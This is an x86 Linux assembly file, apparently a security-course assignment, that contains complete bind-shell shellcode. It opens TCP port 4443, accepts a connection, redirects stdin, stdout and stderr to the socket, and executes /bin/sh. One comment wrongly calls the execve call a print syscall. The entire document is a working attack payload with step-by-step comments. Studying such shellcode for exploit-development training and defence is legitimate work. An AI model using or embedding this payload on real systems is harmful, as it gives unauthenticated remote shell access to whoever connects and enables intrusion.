; SLAE Assignment 1: Shell Bind TCP Shellcode (Linux/x86)
; Author:  4p0cryph0n
; Website:  https://4p0cryph0n.github.io

global _start:

section .text
_start:

        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        cdq

        ; create socket s=socket(2,1,0)
        mov al, 0x66
        inc ebx           ;ebx=1
        push edx          ;0
        push ebx          ;1
        push 0x2          ;2
        mov ecx, esp      ;pointer to args
        int 0x80          ;syscall
        mov esi, eax      ;sockfd

        ; create addr struc and bind(s, 2,port,0, 16)
        mov al, 0x66
        inc ebx          ;ebx=2
        push edx         ;0
        push word 0x5b11 ;4443
        push word bx     ;2
        mov ecx, esp     ;pointer to args
        push 0x10        ;16
        push ecx         ;addr struc
        push esi         ;stockfd
        mov ecx, esp     ;pointer to args
        int 0x80         ;syscall

        ; listen(s,0)
        xor eax, eax     ;eax=0
        mov al, 0x66		
        inc ebx          ;ebx=3
        inc ebx          ;ebx=4
        push ebx         ;4 --> SYS_LISTEN
        push esi         ;sockfd
        mov ecx, esp     ;pointer to args
        int 0x80         ;syscall

        ; accept(s,0,0)
        mov al, 0x66
        inc ebx          ;ebx=5 --> SYS_ACCEPT
        push edx         ;0 --> addrlen
        push edx         ;0 --> sockaddrr
        push esi         ;sockfd
        mov ecx, esp     ;pointer to args
        int 0x80         ;syscall
        mov edi, eax     ;new fd that we get from accept (we will use this for duping)

        ;duplicating stdfds
        xor ecx, ecx     ;ecx=0
        mov cl, 0x3      ;counter for loop. Iterating for 3 stdfds
        dup2:
        xor eax, eax     ;eax=0
        mov al, 0x3f     ;syscall number for dup2
        mov ebx, edi     ;new fd from accept() moved into ebx
        dec cl           ;ecx=2
        int 0x80         ;syscall
        jnz dup2         ;keep looping until the 0 flag is set

        ;execve
        xor ecx, ecx     ;ecx=0
        push ecx         ;pushing the null
        push byte 0x0b   ;print syscall
        pop eax          ;eax=11
        push 0x68732f2f  ;pushing /bin/sh in reverse order
        push 0x6e69622f
        mov ebx, esp     ;pointer to args
        int 0x80         ;syscall
